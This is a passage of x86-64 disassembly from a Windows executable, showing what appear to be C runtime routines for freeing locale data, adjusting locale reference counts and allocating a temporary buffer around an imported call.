   14000800d:	74 0b                	je     0x14000801a
   14000800f:	49 8b 04 06          	mov    (%r14,%rax,1),%rax
   140008013:	c7 40 18 fe ff ff ff 	movl   $0xfffffffe,0x18(%rax)
   14000801a:	ff c6                	inc    %esi
   14000801c:	49 83 c6 08          	add    $0x8,%r14
   140008020:	83 fe 03             	cmp    $0x3,%esi
   140008023:	0f 85 2d ff ff ff    	jne    0x140007f56
   140008029:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000802e:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008033:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008038:	48 8b 7c 24 48       	mov    0x48(%rsp),%rdi
   14000803d:	48 83 c4 20          	add    $0x20,%rsp
   140008041:	41 5e                	pop    %r14
   140008043:	c3                   	ret
   140008044:	40 53                	rex push %rbx
   140008046:	48 83 ec 20          	sub    $0x20,%rsp
   14000804a:	b9 07 00 00 00       	mov    $0x7,%ecx
   14000804f:	e8 d4 df ff ff       	call   0x140006028
   140008054:	33 db                	xor    %ebx,%ebx
   140008056:	33 c9                	xor    %ecx,%ecx
   140008058:	e8 a3 fb ff ff       	call   0x140007c00
   14000805d:	85 c0                	test   %eax,%eax
   14000805f:	75 0c                	jne    0x14000806d
   140008061:	e8 e2 fd ff ff       	call   0x140007e48
   140008066:	e8 cd fe ff ff       	call   0x140007f38
   14000806b:	b3 01                	mov    $0x1,%bl
   14000806d:	b9 07 00 00 00       	mov    $0x7,%ecx
   140008072:	e8 05 e0 ff ff       	call   0x14000607c
   140008077:	8a c3                	mov    %bl,%al
   140008079:	48 83 c4 20          	add    $0x20,%rsp
   14000807d:	5b                   	pop    %rbx
   14000807e:	c3                   	ret
   14000807f:	cc                   	int3
   140008080:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140008085:	57                   	push   %rdi
   140008086:	48 83 ec 20          	sub    $0x20,%rsp
   14000808a:	33 db                	xor    %ebx,%ebx
   14000808c:	48 8d 3d 3d 07 01 00 	lea    0x1073d(%rip),%rdi        # 0x1400187d0
   140008093:	48 8b 0c 3b          	mov    (%rbx,%rdi,1),%rcx
   140008097:	48 85 c9             	test   %rcx,%rcx
   14000809a:	74 0a                	je     0x1400080a6
   14000809c:	e8 0f fb ff ff       	call   0x140007bb0
   1400080a1:	48 83 24 3b 00       	andq   $0x0,(%rbx,%rdi,1)
   1400080a6:	48 83 c3 08          	add    $0x8,%rbx
   1400080aa:	48 81 fb 00 04 00 00 	cmp    $0x400,%rbx
   1400080b1:	72 d9                	jb     0x14000808c
   1400080b3:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400080b8:	b0 01                	mov    $0x1,%al
   1400080ba:	48 83 c4 20          	add    $0x20,%rsp
   1400080be:	5f                   	pop    %rdi
   1400080bf:	c3                   	ret
   1400080c0:	48 85 c9             	test   %rcx,%rcx
   1400080c3:	0f 84 00 01 00 00    	je     0x1400081c9
   1400080c9:	53                   	push   %rbx
   1400080ca:	48 83 ec 20          	sub    $0x20,%rsp
   1400080ce:	48 8b d9             	mov    %rcx,%rbx
   1400080d1:	48 8b 49 18          	mov    0x18(%rcx),%rcx
   1400080d5:	48 3b 0d 4c f6 00 00 	cmp    0xf64c(%rip),%rcx        # 0x140017728
   1400080dc:	74 05                	je     0x1400080e3
   1400080de:	e8 8d e0 ff ff       	call   0x140006170
   1400080e3:	48 8b 4b 20          	mov    0x20(%rbx),%rcx
   1400080e7:	48 3b 0d 42 f6 00 00 	cmp    0xf642(%rip),%rcx        # 0x140017730
   1400080ee:	74 05                	je     0x1400080f5
   1400080f0:	e8 7b e0 ff ff       	call   0x140006170
   1400080f5:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   1400080f9:	48 3b 0d 38 f6 00 00 	cmp    0xf638(%rip),%rcx        # 0x140017738
   140008100:	74 05                	je     0x140008107
   140008102:	e8 69 e0 ff ff       	call   0x140006170
   140008107:	48 8b 4b 30          	mov    0x30(%rbx),%rcx
   14000810b:	48 3b 0d 2e f6 00 00 	cmp    0xf62e(%rip),%rcx        # 0x140017740
   140008112:	74 05                	je     0x140008119
   140008114:	e8 57 e0 ff ff       	call   0x140006170
   140008119:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   14000811d:	48 3b 0d 24 f6 00 00 	cmp    0xf624(%rip),%rcx        # 0x140017748
   140008124:	74 05                	je     0x14000812b
   140008126:	e8 45 e0 ff ff       	call   0x140006170
   14000812b:	48 8b 4b 40          	mov    0x40(%rbx),%rcx
   14000812f:	48 3b 0d 1a f6 00 00 	cmp    0xf61a(%rip),%rcx        # 0x140017750
   140008136:	74 05                	je     0x14000813d
   140008138:	e8 33 e0 ff ff       	call   0x140006170
   14000813d:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140008141:	48 3b 0d 10 f6 00 00 	cmp    0xf610(%rip),%rcx        # 0x140017758
   140008148:	74 05                	je     0x14000814f
   14000814a:	e8 21 e0 ff ff       	call   0x140006170
   14000814f:	48 8b 4b 68          	mov    0x68(%rbx),%rcx
   140008153:	48 3b 0d 1e f6 00 00 	cmp    0xf61e(%rip),%rcx        # 0x140017778
   14000815a:	74 05                	je     0x140008161
   14000815c:	e8 0f e0 ff ff       	call   0x140006170
   140008161:	48 8b 4b 70          	mov    0x70(%rbx),%rcx
   140008165:	48 3b 0d 14 f6 00 00 	cmp    0xf614(%rip),%rcx        # 0x140017780
   14000816c:	74 05                	je     0x140008173
   14000816e:	e8 fd df ff ff       	call   0x140006170
   140008173:	48 8b 4b 78          	mov    0x78(%rbx),%rcx
   140008177:	48 3b 0d 0a f6 00 00 	cmp    0xf60a(%rip),%rcx        # 0x140017788
   14000817e:	74 05                	je     0x140008185
   140008180:	e8 eb df ff ff       	call   0x140006170
   140008185:	48 8b 8b 80 00 00 00 	mov    0x80(%rbx),%rcx
   14000818c:	48 3b 0d fd f5 00 00 	cmp    0xf5fd(%rip),%rcx        # 0x140017790
   140008193:	74 05                	je     0x14000819a
   140008195:	e8 d6 df ff ff       	call   0x140006170
   14000819a:	48 8b 8b 88 00 00 00 	mov    0x88(%rbx),%rcx
   1400081a1:	48 3b 0d f0 f5 00 00 	cmp    0xf5f0(%rip),%rcx        # 0x140017798
   1400081a8:	74 05                	je     0x1400081af
   1400081aa:	e8 c1 df ff ff       	call   0x140006170
   1400081af:	48 8b 8b 90 00 00 00 	mov    0x90(%rbx),%rcx
   1400081b6:	48 3b 0d e3 f5 00 00 	cmp    0xf5e3(%rip),%rcx        # 0x1400177a0
   1400081bd:	74 05                	je     0x1400081c4
   1400081bf:	e8 ac df ff ff       	call   0x140006170
   1400081c4:	48 83 c4 20          	add    $0x20,%rsp
   1400081c8:	5b                   	pop    %rbx
   1400081c9:	c3                   	ret
   1400081ca:	cc                   	int3
   1400081cb:	cc                   	int3
   1400081cc:	48 85 c9             	test   %rcx,%rcx
   1400081cf:	74 66                	je     0x140008237
   1400081d1:	53                   	push   %rbx
   1400081d2:	48 83 ec 20          	sub    $0x20,%rsp
   1400081d6:	48 8b d9             	mov    %rcx,%rbx
   1400081d9:	48 8b 09             	mov    (%rcx),%rcx
   1400081dc:	48 3b 0d 2d f5 00 00 	cmp    0xf52d(%rip),%rcx        # 0x140017710
   1400081e3:	74 05                	je     0x1400081ea
   1400081e5:	e8 86 df ff ff       	call   0x140006170
   1400081ea:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   1400081ee:	48 3b 0d 23 f5 00 00 	cmp    0xf523(%rip),%rcx        # 0x140017718
   1400081f5:	74 05                	je     0x1400081fc
   1400081f7:	e8 74 df ff ff       	call   0x140006170
   1400081fc:	48 8b 4b 10          	mov    0x10(%rbx),%rcx
   140008200:	48 3b 0d 19 f5 00 00 	cmp    0xf519(%rip),%rcx        # 0x140017720
   140008207:	74 05                	je     0x14000820e
   140008209:	e8 62 df ff ff       	call   0x140006170
   14000820e:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140008212:	48 3b 0d 4f f5 00 00 	cmp    0xf54f(%rip),%rcx        # 0x140017768
   140008219:	74 05                	je     0x140008220
   14000821b:	e8 50 df ff ff       	call   0x140006170
   140008220:	48 8b 4b 60          	mov    0x60(%rbx),%rcx
   140008224:	48 3b 0d 45 f5 00 00 	cmp    0xf545(%rip),%rcx        # 0x140017770
   14000822b:	74 05                	je     0x140008232
   14000822d:	e8 3e df ff ff       	call   0x140006170
   140008232:	48 83 c4 20          	add    $0x20,%rsp
   140008236:	5b                   	pop    %rbx
   140008237:	c3                   	ret
   140008238:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000823d:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140008242:	57                   	push   %rdi
   140008243:	48 83 ec 20          	sub    $0x20,%rsp
   140008247:	33 ff                	xor    %edi,%edi
   140008249:	48 8d 04 d1          	lea    (%rcx,%rdx,8),%rax
   14000824d:	48 8b d9             	mov    %rcx,%rbx
   140008250:	48 8b f2             	mov    %rdx,%rsi
   140008253:	48 b9 ff ff ff ff ff 	movabs $0x1fffffffffffffff,%rcx
   14000825a:	ff ff 1f 
   14000825d:	48 23 f1             	and    %rcx,%rsi
   140008260:	48 3b d8             	cmp    %rax,%rbx
   140008263:	48 0f 47 f7          	cmova  %rdi,%rsi
   140008267:	48 85 f6             	test   %rsi,%rsi
   14000826a:	74 14                	je     0x140008280
   14000826c:	48 8b 0b             	mov    (%rbx),%rcx
   14000826f:	e8 fc de ff ff       	call   0x140006170
   140008274:	48 ff c7             	inc    %rdi
   140008277:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   14000827b:	48 3b fe             	cmp    %rsi,%rdi
   14000827e:	75 ec                	jne    0x14000826c
   140008280:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008285:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   14000828a:	48 83 c4 20          	add    $0x20,%rsp
   14000828e:	5f                   	pop    %rdi
   14000828f:	c3                   	ret
   140008290:	48 85 c9             	test   %rcx,%rcx
   140008293:	0f 84 fe 00 00 00    	je     0x140008397
   140008299:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   14000829e:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400082a3:	56                   	push   %rsi
   1400082a4:	48 83 ec 20          	sub    $0x20,%rsp
   1400082a8:	bd 07 00 00 00       	mov    $0x7,%ebp
   1400082ad:	48 8b d9             	mov    %rcx,%rbx
   1400082b0:	8b d5                	mov    %ebp,%edx
   1400082b2:	e8 81 ff ff ff       	call   0x140008238
   1400082b7:	48 8d 4b 38          	lea    0x38(%rbx),%rcx
   1400082bb:	8b d5                	mov    %ebp,%edx
   1400082bd:	e8 76 ff ff ff       	call   0x140008238
   1400082c2:	8d 75 05             	lea    0x5(%rbp),%esi
   1400082c5:	8b d6                	mov    %esi,%edx
   1400082c7:	48 8d 4b 70          	lea    0x70(%rbx),%rcx
   1400082cb:	e8 68 ff ff ff       	call   0x140008238
   1400082d0:	48 8d 8b d0 00 00 00 	lea    0xd0(%rbx),%rcx
   1400082d7:	8b d6                	mov    %esi,%edx
   1400082d9:	e8 5a ff ff ff       	call   0x140008238
   1400082de:	48 8d 8b 30 01 00 00 	lea    0x130(%rbx),%rcx
   1400082e5:	8d 55 fb             	lea    -0x5(%rbp),%edx
   1400082e8:	e8 4b ff ff ff       	call   0x140008238
   1400082ed:	48 8b 8b 40 01 00 00 	mov    0x140(%rbx),%rcx
   1400082f4:	e8 77 de ff ff       	call   0x140006170
   1400082f9:	48 8b 8b 48 01 00 00 	mov    0x148(%rbx),%rcx
   140008300:	e8 6b de ff ff       	call   0x140006170
   140008305:	48 8b 8b 50 01 00 00 	mov    0x150(%rbx),%rcx
   14000830c:	e8 5f de ff ff       	call   0x140006170
   140008311:	48 8d 8b 60 01 00 00 	lea    0x160(%rbx),%rcx
   140008318:	8b d5                	mov    %ebp,%edx
   14000831a:	e8 19 ff ff ff       	call   0x140008238
   14000831f:	48 8d 8b 98 01 00 00 	lea    0x198(%rbx),%rcx
   140008326:	8b d5                	mov    %ebp,%edx
   140008328:	e8 0b ff ff ff       	call   0x140008238
   14000832d:	48 8d 8b d0 01 00 00 	lea    0x1d0(%rbx),%rcx
   140008334:	8b d6                	mov    %esi,%edx
   140008336:	e8 fd fe ff ff       	call   0x140008238
   14000833b:	48 8d 8b 30 02 00 00 	lea    0x230(%rbx),%rcx
   140008342:	8b d6                	mov    %esi,%edx
   140008344:	e8 ef fe ff ff       	call   0x140008238
   140008349:	48 8d 8b 90 02 00 00 	lea    0x290(%rbx),%rcx
   140008350:	8d 55 fb             	lea    -0x5(%rbp),%edx
   140008353:	e8 e0 fe ff ff       	call   0x140008238
   140008358:	48 8b 8b a0 02 00 00 	mov    0x2a0(%rbx),%rcx
   14000835f:	e8 0c de ff ff       	call   0x140006170
   140008364:	48 8b 8b a8 02 00 00 	mov    0x2a8(%rbx),%rcx
   14000836b:	e8 00 de ff ff       	call   0x140006170
   140008370:	48 8b 8b b0 02 00 00 	mov    0x2b0(%rbx),%rcx
   140008377:	e8 f4 dd ff ff       	call   0x140006170
   14000837c:	48 8b 8b b8 02 00 00 	mov    0x2b8(%rbx),%rcx
   140008383:	e8 e8 dd ff ff       	call   0x140006170
   140008388:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000838d:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   140008392:	48 83 c4 20          	add    $0x20,%rsp
   140008396:	5e                   	pop    %rsi
   140008397:	c3                   	ret
   140008398:	40 55                	rex push %rbp
   14000839a:	41 54                	push   %r12
   14000839c:	41 55                	push   %r13
   14000839e:	41 56                	push   %r14
   1400083a0:	41 57                	push   %r15
   1400083a2:	48 83 ec 60          	sub    $0x60,%rsp
   1400083a6:	48 8d 6c 24 30       	lea    0x30(%rsp),%rbp
   1400083ab:	48 89 5d 60          	mov    %rbx,0x60(%rbp)
   1400083af:	48 89 75 68          	mov    %rsi,0x68(%rbp)
   1400083b3:	48 89 7d 70          	mov    %rdi,0x70(%rbp)
   1400083b7:	48 8b 05 42 ec 00 00 	mov    0xec42(%rip),%rax        # 0x140017000
   1400083be:	48 33 c5             	xor    %rbp,%rax
   1400083c1:	48 89 45 20          	mov    %rax,0x20(%rbp)
   1400083c5:	44 8b ea             	mov    %edx,%r13d
   1400083c8:	45 8b f9             	mov    %r9d,%r15d
   1400083cb:	48 8b d1             	mov    %rcx,%rdx
   1400083ce:	4d 8b e0             	mov    %r8,%r12
   1400083d1:	48 8d 4d 00          	lea    0x0(%rbp),%rcx
   1400083d5:	e8 66 b6 ff ff       	call   0x140003a40
   1400083da:	8b bd 88 00 00 00    	mov    0x88(%rbp),%edi
   1400083e0:	85 ff                	test   %edi,%edi
   1400083e2:	75 07                	jne    0x1400083eb
   1400083e4:	48 8b 45 08          	mov    0x8(%rbp),%rax
   1400083e8:	8b 78 0c             	mov    0xc(%rax),%edi
   1400083eb:	f7 9d 90 00 00 00    	negl   0x90(%rbp)
   1400083f1:	45 8b cf             	mov    %r15d,%r9d
   1400083f4:	4d 8b c4             	mov    %r12,%r8
   1400083f7:	8b cf                	mov    %edi,%ecx
   1400083f9:	1b d2                	sbb    %edx,%edx
   1400083fb:	83 64 24 28 00       	andl   $0x0,0x28(%rsp)
   140008400:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140008406:	83 e2 08             	and    $0x8,%edx
   140008409:	ff c2                	inc    %edx
   14000840b:	e8 ac f4 ff ff       	call   0x1400078bc
   140008410:	4c 63 f0             	movslq %eax,%r14
   140008413:	85 c0                	test   %eax,%eax
   140008415:	75 07                	jne    0x14000841e
   140008417:	33 ff                	xor    %edi,%edi
   140008419:	e9 ce 00 00 00       	jmp    0x1400084ec
   14000841e:	49 8b f6             	mov    %r14,%rsi
   140008421:	48 03 f6             	add    %rsi,%rsi
   140008424:	48 8d 46 10          	lea    0x10(%rsi),%rax
   140008428:	48 3b f0             	cmp    %rax,%rsi
   14000842b:	48 1b c9             	sbb    %rcx,%rcx
   14000842e:	48 23 c8             	and    %rax,%rcx
   140008431:	74 53                	je     0x140008486
   140008433:	48 81 f9 00 04 00 00 	cmp    $0x400,%rcx
   14000843a:	77 31                	ja     0x14000846d
   14000843c:	48 8d 41 0f          	lea    0xf(%rcx),%rax
   140008440:	48 3b c1             	cmp    %rcx,%rax
   140008443:	77 0a                	ja     0x14000844f
   140008445:	48 b8 f0 ff ff ff ff 	movabs $0xffffffffffffff0,%rax
   14000844c:	ff ff 0f 
   14000844f:	48 83 e0 f0          	and    $0xfffffffffffffff0,%rax
   140008453:	e8 d8 44 00 00       	call   0x14000c930
   140008458:	48 2b e0             	sub    %rax,%rsp
   14000845b:	48 8d 5c 24 30       	lea    0x30(%rsp),%rbx
   140008460:	48 85 db             	test   %rbx,%rbx
   140008463:	74 6f                	je     0x1400084d4
   140008465:	c7 03 cc cc 00 00    	movl   $0xcccc,(%rbx)
   14000846b:	eb 13                	jmp    0x140008480
   14000846d:	e8 26 dc ff ff       	call   0x140006098
   140008472:	48 8b d8             	mov    %rax,%rbx
   140008475:	48 85 c0             	test   %rax,%rax
   140008478:	74 0e                	je     0x140008488
   14000847a:	c7 00 dd dd 00 00    	movl   $0xdddd,(%rax)
   140008480:	48 83 c3 10          	add    $0x10,%rbx
   140008484:	eb 02                	jmp    0x140008488
   140008486:	33 db                	xor    %ebx,%ebx
   140008488:	48 85 db             	test   %rbx,%rbx
   14000848b:	74 47                	je     0x1400084d4
   14000848d:	4c 8b c6             	mov    %rsi,%r8
   140008490:	33 d2                	xor    %edx,%edx
   140008492:	48 8b cb             	mov    %rbx,%rcx
   140008495:	e8 86 a4 ff ff       	call   0x140002920
   14000849a:	45 8b cf             	mov    %r15d,%r9d
   14000849d:	44 89 74 24 28       	mov    %r14d,0x28(%rsp)
   1400084a2:	4d 8b c4             	mov    %r12,%r8
   1400084a5:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   1400084aa:	ba 01 00 00 00       	mov    $0x1,%edx
   1400084af:	8b cf                	mov    %edi,%ecx
   1400084b1:	e8 06 f4 ff ff       	call   0x1400078bc
   1400084b6:	85 c0                	test   %eax,%eax
   1400084b8:	74 1a                	je     0x1400084d4
   1400084ba:	4c 8b 8d 80 00 00 00 	mov    0x80(%rbp),%r9
   1400084c1:	44 8b c0             	mov    %eax,%r8d
   1400084c4:	48 8b d3             	mov    %rbx,%rdx
   1400084c7:	41 8b cd             	mov    %r13d,%ecx
   1400084ca:	ff 15 70 4d 00 00    	call   *0x4d70(%rip)        # 0x14000d240
   1400084d0:	8b f8                	mov    %eax,%edi
   1400084d2:	eb 02                	jmp    0x1400084d6
   1400084d4:	33 ff                	xor    %edi,%edi
   1400084d6:	48 85 db             	test   %rbx,%rbx
   1400084d9:	74 11                	je     0x1400084ec
   1400084db:	48 8d 4b f0          	lea    -0x10(%rbx),%rcx
   1400084df:	81 39 dd dd 00 00    	cmpl   $0xdddd,(%rcx)
   1400084e5:	75 05                	jne    0x1400084ec
   1400084e7:	e8 84 dc ff ff       	call   0x140006170
   1400084ec:	80 7d 18 00          	cmpb   $0x0,0x18(%rbp)
   1400084f0:	74 0b                	je     0x1400084fd
   1400084f2:	48 8b 45 00          	mov    0x0(%rbp),%rax
   1400084f6:	83 a0 a8 03 00 00 fd 	andl   $0xfffffffd,0x3a8(%rax)
   1400084fd:	8b c7                	mov    %edi,%eax
   1400084ff:	48 8b 4d 20          	mov    0x20(%rbp),%rcx
   140008503:	48 33 cd             	xor    %rbp,%rcx
   140008506:	e8 75 90 ff ff       	call   0x140001580
   14000850b:	48 8b 5d 60          	mov    0x60(%rbp),%rbx
   14000850f:	48 8b 75 68          	mov    0x68(%rbp),%rsi
   140008513:	48 8b 7d 70          	mov    0x70(%rbp),%rdi
   140008517:	48 8d 65 30          	lea    0x30(%rbp),%rsp
   14000851b:	41 5f                	pop    %r15
   14000851d:	41 5e                	pop    %r14
   14000851f:	41 5d                	pop    %r13
   140008521:	41 5c                	pop    %r12
   140008523:	5d                   	pop    %rbp
   140008524:	c3                   	ret
   140008525:	cc                   	int3
   140008526:	cc                   	int3
   140008527:	cc                   	int3
   140008528:	f0 ff 41 10          	lock incl 0x10(%rcx)
   14000852c:	48 8b 81 e0 00 00 00 	mov    0xe0(%rcx),%rax
   140008533:	48 85 c0             	test   %rax,%rax
   140008536:	74 03                	je     0x14000853b
   140008538:	f0 ff 00             	lock incl (%rax)
   14000853b:	48 8b 81 f0 00 00 00 	mov    0xf0(%rcx),%rax
   140008542:	48 85 c0             	test   %rax,%rax
   140008545:	74 03                	je     0x14000854a
   140008547:	f0 ff 00             	lock incl (%rax)
   14000854a:	48 8b 81 e8 00 00 00 	mov    0xe8(%rcx),%rax
   140008551:	48 85 c0             	test   %rax,%rax
   140008554:	74 03                	je     0x140008559
   140008556:	f0 ff 00             	lock incl (%rax)
   140008559:	48 8b 81 00 01 00 00 	mov    0x100(%rcx),%rax
   140008560:	48 85 c0             	test   %rax,%rax
   140008563:	74 03                	je     0x140008568
   140008565:	f0 ff 00             	lock incl (%rax)
   140008568:	48 8d 41 38          	lea    0x38(%rcx),%rax
   14000856c:	41 b8 06 00 00 00    	mov    $0x6,%r8d
   140008572:	48 8d 15 4f ec 00 00 	lea    0xec4f(%rip),%rdx        # 0x1400171c8
   140008579:	48 39 50 f0          	cmp    %rdx,-0x10(%rax)
   14000857d:	74 0b                	je     0x14000858a
   14000857f:	48 8b 10             	mov    (%rax),%rdx
   140008582:	48 85 d2             	test   %rdx,%rdx
   140008585:	74 03                	je     0x14000858a
   140008587:	f0 ff 02             	lock incl (%rdx)
   14000858a:	48 83 78 e8 00       	cmpq   $0x0,-0x18(%rax)
   14000858f:	74 0c                	je     0x14000859d
   140008591:	48 8b 50 f8          	mov    -0x8(%rax),%rdx
   140008595:	48 85 d2             	test   %rdx,%rdx
   140008598:	74 03                	je     0x14000859d
   14000859a:	f0 ff 02             	lock incl (%rdx)
   14000859d:	48 83 c0 20          	add    $0x20,%rax
   1400085a1:	49 83 e8 01          	sub    $0x1,%r8
   1400085a5:	75 cb                	jne    0x140008572
   1400085a7:	48 8b 89 20 01 00 00 	mov    0x120(%rcx),%rcx
   1400085ae:	e9 79 01 00 00       	jmp    0x14000872c
   1400085b3:	cc                   	int3
   1400085b4:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400085b9:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400085be:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400085c3:	57                   	push   %rdi
   1400085c4:	48 83 ec 20          	sub    $0x20,%rsp
   1400085c8:	48 8b 81 f8 00 00 00 	mov    0xf8(%rcx),%rax
   1400085cf:	48 8b d9             	mov    %rcx,%rbx
   1400085d2:	48 85 c0             	test   %rax,%rax
   1400085d5:	74 79                	je     0x140008650
   1400085d7:	48 8d 0d 32 f1 00 00 	lea    0xf132(%rip),%rcx        # 0x140017710
   1400085de:	48 3b c1             	cmp    %rcx,%rax
   1400085e1:	74 6d                	je     0x140008650
   1400085e3:	48 8b 83 e0 00 00 00 	mov    0xe0(%rbx),%rax
   1400085ea:	48 85 c0             	test   %rax,%rax
   1400085ed:	74 61                	je     0x140008650
   1400085ef:	83 38 00             	cmpl   $0x0,(%rax)
   1400085f2:	75 5c                	jne    0x140008650
   1400085f4:	48 8b 8b f0 00 00 00 	mov    0xf0(%rbx),%rcx
   1400085fb:	48 85 c9             	test   %rcx,%rcx
   1400085fe:	74 16                	je     0x140008616
   140008600:	83 39 00             	cmpl   $0x0,(%rcx)
   140008603:	75 11                	jne    0x140008616
   140008605:	e8 66 db ff ff       	call   0x140006170
   14000860a:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008611:	e8 aa fa ff ff       	call   0x1400080c0
   140008616:	48 8b 8b e8 00 00 00 	mov    0xe8(%rbx),%rcx
   14000861d:	48 85 c9             	test   %rcx,%rcx
   140008620:	74 16                	je     0x140008638
   140008622:	83 39 00             	cmpl   $0x0,(%rcx)
   140008625:	75 11                	jne    0x140008638
   140008627:	e8 44 db ff ff       	call   0x140006170
   14000862c:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   140008633:	e8 94 fb ff ff       	call   0x1400081cc
   140008638:	48 8b 8b e0 00 00 00 	mov    0xe0(%rbx),%rcx
   14000863f:	e8 2c db ff ff       	call   0x140006170
   140008644:	48 8b 8b f8 00 00 00 	mov    0xf8(%rbx),%rcx
   14000864b:	e8 20 db ff ff       	call   0x140006170
   140008650:	48 8b 83 00 01 00 00 	mov    0x100(%rbx),%rax
   140008657:	48 85 c0             	test   %rax,%rax
   14000865a:	74 47                	je     0x1400086a3
   14000865c:	83 38 00             	cmpl   $0x0,(%rax)
   14000865f:	75 42                	jne    0x1400086a3
   140008661:	48 8b 8b 08 01 00 00 	mov    0x108(%rbx),%rcx
   140008668:	48 81 e9 fe 00 00 00 	sub    $0xfe,%rcx
   14000866f:	e8 fc da ff ff       	call   0x140006170
   140008674:	48 8b 8b 10 01 00 00 	mov    0x110(%rbx),%rcx
   14000867b:	bf 80 00 00 00       	mov    $0x80,%edi
   140008680:	48 2b cf             	sub    %rdi,%rcx
   140008683:	e8 e8 da ff ff       	call   0x140006170
   140008688:	48 8b 8b 18 01 00 00 	mov    0x118(%rbx),%rcx
   14000868f:	48 2b cf             	sub    %rdi,%rcx
   140008692:	e8 d9 da ff ff       	call   0x140006170
   140008697:	48 8b 8b 00 01 00 00 	mov    0x100(%rbx),%rcx
   14000869e:	e8 cd da ff ff       	call   0x140006170
   1400086a3:	48 8b 8b 20 01 00 00 	mov    0x120(%rbx),%rcx
   1400086aa:	e8 a5 00 00 00       	call   0x140008754
   1400086af:	48 8d b3 28 01 00 00 	lea    0x128(%rbx),%rsi
   1400086b6:	bd 06 00 00 00       	mov    $0x6,%ebp
   1400086bb:	48 8d 7b 38          	lea    0x38(%rbx),%rdi
   1400086bf:	48 8d 05 02 eb 00 00 	lea    0xeb02(%rip),%rax        # 0x1400171c8
   1400086c6:	48 39 47 f0          	cmp    %rax,-0x10(%rdi)
   1400086ca:	74 1a                	je     0x1400086e6
   1400086cc:	48 8b 0f             	mov    (%rdi),%rcx
   1400086cf:	48 85 c9             	test   %rcx,%rcx
   1400086d2:	74 12                	je     0x1400086e6
   1400086d4:	83 39 00             	cmpl   $0x0,(%rcx)
   1400086d7:	75 0d                	jne    0x1400086e6
   1400086d9:	e8 92 da ff ff       	call   0x140006170
   1400086de:	48 8b 0e             	mov    (%rsi),%rcx
   1400086e1:	e8 8a da ff ff       	call   0x140006170
   1400086e6:	48 83 7f e8 00       	cmpq   $0x0,-0x18(%rdi)
   1400086eb:	74 13                	je     0x140008700
   1400086ed:	48 8b 4f f8          	mov    -0x8(%rdi),%rcx
   1400086f1:	48 85 c9             	test   %rcx,%rcx
   1400086f4:	74 0a                	je     0x140008700
   1400086f6:	83 39 00             	cmpl   $0x0,(%rcx)
   1400086f9:	75 05                	jne    0x140008700
   1400086fb:	e8 70 da ff ff       	call   0x140006170
   140008700:	48 83 c6 08          	add    $0x8,%rsi
   140008704:	48 83 c7 20          	add    $0x20,%rdi
   140008708:	48 83 ed 01          	sub    $0x1,%rbp
   14000870c:	75 b1                	jne    0x1400086bf
   14000870e:	48 8b cb             	mov    %rbx,%rcx
   140008711:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140008716:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000871b:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140008720:	48 83 c4 20          	add    $0x20,%rsp
   140008724:	5f                   	pop    %rdi
   140008725:	e9 46 da ff ff       	jmp    0x140006170
   14000872a:	cc                   	int3
   14000872b:	cc                   	int3
   14000872c:	48 85 c9             	test   %rcx,%rcx
   14000872f:	74 1c                	je     0x14000874d
   140008731:	48 8d 05 28 65 00 00 	lea    0x6528(%rip),%rax        # 0x14000ec60
   140008738:	48 3b c8             	cmp    %rax,%rcx
   14000873b:	74 10                	je     0x14000874d
   14000873d:	b8 01 00 00 00       	mov    $0x1,%eax
   140008742:	f0 0f c1 81 5c 01 00 	lock xadd %eax,0x15c(%rcx)
   140008749:	00 
   14000874a:	ff c0                	inc    %eax
   14000874c:	c3                   	ret
   14000874d:	b8 ff ff ff 7f       	mov    $0x7fffffff,%eax
   140008752:	c3                   	ret
   140008753:	cc                   	int3
   140008754:	48 85 c9             	test   %rcx,%rcx
   140008757:	74 30                	je     0x140008789
   140008759:	53                   	push   %rbx
   14000875a:	48 83 ec 20          	sub    $0x20,%rsp
   14000875e:	48 8d 05 fb 64 00 00 	lea    0x64fb(%rip),%rax        # 0x14000ec60
   140008765:	48 8b d9             	mov    %rcx,%rbx
   140008768:	48 3b c8             	cmp    %rax,%rcx
   14000876b:	74 17                	je     0x140008784
   14000876d:	8b 81 5c 01 00 00    	mov    0x15c(%rcx),%eax
   140008773:	85 c0                	test   %eax,%eax
   140008775:	75 0d                	jne    0x140008784
   140008777:	e8 14 fb ff ff       	call   0x140008290
   14000877c:	48 8b cb             	mov    %rbx,%rcx
   14000877f:	e8 ec d9 ff ff       	call   0x140006170
   140008784:	48 83 c4 20          	add    $0x20,%rsp
   140008788:	5b                   	pop    %rbx
   140008789:	c3                   	ret
   14000878a:	cc                   	int3
   14000878b:	cc                   	int3
   14000878c:	48 85 c9             	test   %rcx,%rcx
   14000878f:	74 1a                	je     0x1400087ab
   140008791:	48 8d 05 c8 64 00 00 	lea    0x64c8(%rip),%rax        # 0x14000ec60
   140008798:	48 3b c8             	cmp    %rax,%rcx
   14000879b:	74 0e                	je     0x1400087ab
